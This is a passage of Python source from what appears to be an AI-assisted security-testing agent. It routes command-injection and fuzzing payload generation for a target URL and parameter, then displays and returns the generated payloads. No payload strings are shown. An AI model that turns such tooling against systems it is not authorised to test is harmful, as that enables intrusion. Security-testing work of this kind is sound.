        payloads = await generate_command_injection_payloads(
            url, parameter, technologies,
            context.get("os_hint", "unknown"),
            context.get("filtering", ""),
        )
    elif vuln_type == "fuzzing":
        payloads = await generate_fuzzing_payloads(
            url, parameter, technologies,
            context.get("param_type", "unknown"),
            context.get("response_patterns", ""),
        )
    else:
        # Generic payload generation
        payloads = await generate_fuzzing_payloads(url, parameter, technologies)

    # Send UI message with generated payloads
    if task_id and payloads:
        # Format payloads for display (show first 10, truncate long ones)
        payload_display = []
        for i, p in enumerate(payloads[:10]):
            # Truncate very long payloads for display
            display_p = p if len(p) <= 80 else p[:77] + "..."
            payload_display.append(f"`{display_p}`")

        remaining = len(payloads) - 10 if len(payloads) > 10 else 0
        remaining_text = f"\n*...and {remaining} more payloads*" if remaining > 0 else ""

        await adk.messages.create(
            task_id=task_id,
            content=TextContent(
                author="agent",
                content=f"""### 🎯 AI-Generated {vuln_display_name} Payloads

**Target:** `{url}`
**Parameter:** `{parameter}`
**Payloads Generated:** {len(payloads)}

**Creative Payloads:**
{chr(10).join([f"- {p}" for p in payload_display])}{remaining_text}

*These payloads were dynamically generated by AI based on the target context, technologies detected, and potential bypass techniques.*
""",
            ),
            trace_id=trace_id or "",
        )

    return {
        "vuln_type": vuln_type,
        "url": url,
        "parameter": parameter,
        "payloads": payloads,
        "count": len(payloads),
        "generated_at": datetime.utcnow().isoformat(),
    }
